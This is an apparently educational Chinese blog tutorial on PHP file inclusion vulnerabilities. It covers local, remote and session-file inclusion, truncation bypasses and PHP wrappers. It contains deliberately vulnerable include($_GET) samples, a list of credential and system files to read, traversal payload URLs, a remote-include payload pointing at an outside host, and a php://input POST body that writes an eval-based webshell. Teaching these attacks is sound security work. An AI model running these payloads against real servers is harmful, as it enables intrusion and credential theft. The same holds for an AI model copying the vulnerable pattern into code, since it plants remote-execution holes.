@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="文件包含漏洞 文件包含简介 服务器执行PHP文件的时候，可以通过文件包含函数加载另一个文件的PHP代码。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。 文件包含函数 PHP中有以下4种文件包含函数 require() require_once()...">
+        <meta name="keywords" content="file-include, php">
+        <link rel="icon" href="/favicon.ico">
+
+        <title>文件包含漏洞 - Czj's 博客</title>
+
+        <!-- Stylesheets -->
+        <link href="/theme/css/all.min.css" rel="stylesheet">
+        <!-- /Stylesheets -->
+
+        <!-- RSS Feeds -->
+        <!-- /RSS Feeds -->
+
+        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+    </head>
+
+    <body>
+
+        <!-- Header -->
+    <div class="header-container" style="background: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)), url('/images/abc.jpg'); background-position: center; background-size: cover;">
+
+            <!-- Static navbar -->
+            <div class="container">
+                <div class="header-nav">
+                    <div class="header-logo">
+                        <a class="pull-left" href="/">MyBlog</a>
+                    </div>
+                    <div class="nav pull-right">
+                                <a href="/">首页</a>
+                                <a href="/categories.html">分类</a>
+                                <a href="/tags.html">标签</a>
+                    </div>
+                </div>
+            </div>
+            <!-- /Static navbar -->
+
+            <!-- Header -->
+    <!-- Header -->
+    <div class="container header-wrapper">
+        <div class="row">
+              <div class="col-lg-12">
+                  <div class="header-content">
+                      <h1 class="header-title">文件包含漏洞</h1>
+                      <p class="header-date">By <a href="/author/czj.html">Czj</a>, 2019-09-24, 分类:  <a href="/category/summary.html">Summary</a></p>
+                      <div class="header-underline"></div>
+                      <div class="clearfix"></div>
+                      <p class="pull-right header-tags">
+                          <span class="glyphicon glyphicon-tags mr5" aria-hidden="true"></span>
+<a href="/tag/file-include.html">file-include</a>, <a href="/tag/php.html">php</a>                      </p>
+                  </div>
+              </div>
+        </div>
+    </div>
+    <!-- /Header -->
+            <!-- /Header -->
+
+        </div>
+        <!-- /Header -->
+
+
+        <!-- Content -->
+    <div class="container content">
+        <h1>文件包含漏洞</h1>
+<h2>文件包含简介</h2>
+<p>服务器执行PHP文件的时候，可以通过文件包含函数加载另一个文件的PHP代码。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
+<h3>文件包含函数</h3>
+<p>PHP中有以下4种文件包含函数</p>
+<div class="highlight"><pre><span></span><span class="x">require()</span>
+
+<span class="x">require_once()</span>
+
+<span class="x">include()</span>
+
+<span class="x">include_once()</span>
+</pre></div>
+
+
+<p>require()和include()的区别是，当require函数出现错误的时候，会直接报错并退出程序。而include出现错误的时候会警告，程序继续运行。</p>
+<p>once的区别是，这两个函数只包含文件一次。避免同一文件被包含两次。</p>
+<h2>本地文件包含漏洞</h2>
+<h3>无限制本地文件包含漏洞</h3>
+<p>函数的参数没有过滤，可以被用户控制，包含其他恶意文件，执行了非预期的代码</p>
+<p>例如：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>用户可以修改$filename的值，执行其他的文件。通过目录遍历漏洞可以获取到系统中其他文件的内容</p>
+<p>敏感信息路径：</p>
+<div class="highlight"><pre><span></span><span class="n">c</span><span class="p">:</span>\<span class="n">boot</span><span class="o">.</span><span class="n">ini</span> <span class="o">//</span> <span class="err">查看系统版本</span>
+
+<span class="n">c</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">system32</span>\<span class="n">inetsrv</span>\<span class="n">MetaBase</span><span class="o">.</span><span class="n">xml</span> <span class="o">//</span> <span class="n">IIS配置文件</span>
+
+<span class="n">c</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">repair</span>\<span class="n">sam</span> <span class="o">//</span> <span class="err">存储</span><span class="n">Windows系统初次安装的密码</span>
+
+<span class="n">c</span><span class="p">:</span>\<span class="n">ProgramFiles</span>\<span class="n">mysql</span>\<span class="n">my</span><span class="o">.</span><span class="n">ini</span> <span class="o">//</span> <span class="n">MySQL配置</span>
+
+<span class="n">c</span><span class="p">:</span>\<span class="n">ProgramFiles</span>\<span class="n">mysql</span>\<span class="n">data</span>\<span class="n">mysql</span>\<span class="n">user</span><span class="o">.</span><span class="n">MYD</span> <span class="o">//</span> <span class="n">MySQL</span> <span class="n">root密码</span>
+
+<span class="n">c</span><span class="p">:</span>\<span class="n">windows</span>\<span class="n">php</span><span class="o">.</span><span class="n">ini</span> <span class="o">//</span> <span class="n">php</span> <span class="err">配置信息</span>
+
+
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">//</span> <span class="err">账户信息</span>
+
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">shadow</span> <span class="o">//</span> <span class="err">账户密码文件</span>
+
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span> <span class="n">Apache2默认配置文件</span>
+
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">extra</span><span class="o">/</span><span class="n">httpd</span><span class="o">-</span><span class="n">vhost</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span> <span class="err">虚拟网站配置</span>
+
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">php5</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php</span><span class="o">.</span><span class="n">ini</span> <span class="o">//</span> <span class="n">PHP相关配置</span>
+
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">httpd</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span> <span class="n">Apache配置文件</span>
+
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">my</span><span class="o">.</span><span class="n">conf</span> <span class="o">//</span> <span class="n">mysql</span> <span class="err">配置文件</span>
+</pre></div>
+
+
+<h3>session文件包含漏洞</h3>
+<p>条件：</p>
+<ol>
+<li>通过phpinfo()可以获取session的存储位置。session.save_path</li>
+<li>通过猜测默认的session存放位置进行尝试。如linux下默认存储在/var/lib/php/session目录下</li>
+</ol>
+<p>session的内容可以被控制，传入恶意代码。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="nv">$ctfs</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfs&#39;</span><span class="p">];</span>
+
+<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$ctfs</span><span class="p">;</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<p>session_start() 启动新会话或者重用现有会话</p>
+<p>php7以前，我们使用session前都是要先用session_strat()函数来初始化的，但这个函数是没有参数可以传的，session的配置都在php.ini文件中，</p>
+<p>在php7后session_start() 可以接受一个 array 作为参数， 用来覆盖 php.ini 文件中设置的 会话配置选项。</p>
+<p>此php会将获取到的GET型ctfs变量的值存入到session中。</p>
+<p>如当访问http://www.ctfs-wiki/session.php?ctfs=ctfs 后，会在/var/lib/php/session目录下存储session的值。</p>
+<p>session的文件名为sess_+sessionid，sessionid可以通过开发者模式获取，在cookie中</p>
+<p>sess_akp79gfiedh13ho11i6f3sm6s6</p>
+<p>通过上面的分析，可以知道ctfs传入的值会存储到session文件中，如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码getshell。</p>
+<p>当访问http://www.ctfs-wiki/session.php?ctfs=&lt;?php phpinfo();?&gt;后，会在/var/lib/php/session目录下存储session的值。</p>
+<p>攻击者通过phpinfo()信息泄露或者猜测能获取到session存放的位置，文件名称通过开发者模式可获取到，然后通过文件包含的漏洞解析恶意代码getshell。（一句话木马）</p>
+<h3>有限制文件包含漏洞绕过</h3>
+<p><strong>%00截断</strong></p>
+<p>条件：magic_quotes_gpc = Off  php版本&lt;5.3.4</p>
+<p>代码</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&quot;.html&quot;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">http://www.ctfs-wiki.com/FI/FI.php?filename=../../../../../../../boot.ini%00</span>
+</pre></div>
+
+
+<p><strong>路径长度截断</strong></p>
+<p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
+<p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
+<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&quot;.html&quot;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/././././././././././././././././././././././././多加几个</span>
+</pre></div>
+
+
+<p><strong>点号截断</strong></p>
+<p>条件：windows OS，点号需要长于256</p>
+<div class="highlight"><pre><span></span><span class="x">http://www.ctfs-wiki.com/FI/FI.php</span>
+<span class="x">?filename=test.txt.......................................</span>
+</pre></div>
+
+
+<h2>远程文件包含漏洞</h2>
+<p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
+<p>allow_url_fopen = On（是否允许打开远程文件）</p>
+<p>allow_url_include = On（是否允许include/require远程文件）</p>
+<h3>无限制远程文件包含漏洞</h3>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">payload: http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt</span>
+</pre></div>
+
+
+<h3>有限制远程文件包含漏洞</h3>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;.html&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">payload: http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt？</span>
+<span class="x">可以用？或 # %23 或 空格%20 绕过</span>
+</pre></div>
+
+
+<h2>PHP伪协议</h2>
+<p>php支持的伪协议：</p>
+<div class="highlight"><pre><span></span><span class="x">file:// — 访问本地文件系统</span>
+<span class="x">http:// — 访问 HTTP(s) 网址</span>
+<span class="x">ftp:// — 访问 FTP(s) URLs</span>
+<span class="x">php:// — 访问各个输入/输出流（I/O streams）</span>
+<span class="x">zlib:// — 压缩流</span>
+<span class="x">data:// — 数据（RFC 2397）</span>
+<span class="x">glob:// — 查找匹配的文件路径模式</span>
+<span class="x">phar:// — PHP 归档</span>
+<span class="x">ssh2:// — Secure Shell 2</span>
+<span class="x">rar:// — RAR</span>
+<span class="x">ogg:// — 音频流</span>
+<span class="x">expect:// — 处理交互式的流</span>
+</pre></div>
+
+
+<h3>php:// 输入输出流</h3>
+<p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<h4>php://filter 本地磁盘文件读取</h4>
+<p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p>
+<p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
+<p>?filename=php://filter/read=convert.base64-encode/resource=xxx.php 一样。</p>
+<h4>php://input</h4>
+<p>可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
+<p>碰到file_get_contents()就要想到用<strong>php://input</strong>绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;php://input&quot;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x"> 可以读取到post中的变量</span>
+</pre></div>
+
+
+<p>php://input (写木马)</p>
+<p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。</p>
+<p>如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">  post的数据：</span><span class="cp">&lt;?PHP</span> <span class="nb">fputs</span><span class="p">(</span><span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+
+
+<h3>file://伪协议（读取本地文件）</h3>
+<p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
+<p>file://+路径</p>
+<h3>data://伪协议</h3>
+<p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的；</p>
+<p>payload： data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
+
+
+        
+    </div>
+        <!-- /Content --> 
+
+        <!-- Footer -->
+        <div class="footer gradient-2">
+            <div class="container footer-container ">
+                <div class="row">
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Sitemap</div>
+                        <ul class="list-unstyled">
+                            <li><a href="/archives.html">Archives</a></li>
+                            <li><a href="/tags.html">Tags</a></li>
+                            <li><a href="/authors.html">Authors</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Social</div>
+                        <ul class="list-unstyled">
+                            <li><a href="#" target="_blank">You can add links in your config file</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Links</div>
+                        <ul class="list-unstyled">
+                            <li><a href="http://getpelican.com/" target="_blank">Pelican</a></li>
+                            <li><a href="http://python.org/" target="_blank">Python.org</a></li>
+                            <li><a href="http://jinja.pocoo.org/" target="_blank">Jinja2</a></li>
+                        </ul>
+                    </div> 
+                    <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3">
+                        <p class="pull-right text-right">
+                            <small><em>Proudly powered by <a href="http://docs.getpelican.com/" target="_blank">pelican</a></em></small><br/>
+                            <small><em>Theme and code by <a href="https://github.com/molivier" target="_blank">molivier</a></em></small><br/>
+                            <small>&copy; blogname 2015</small>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /Footer -->
+    </body>
+</html>
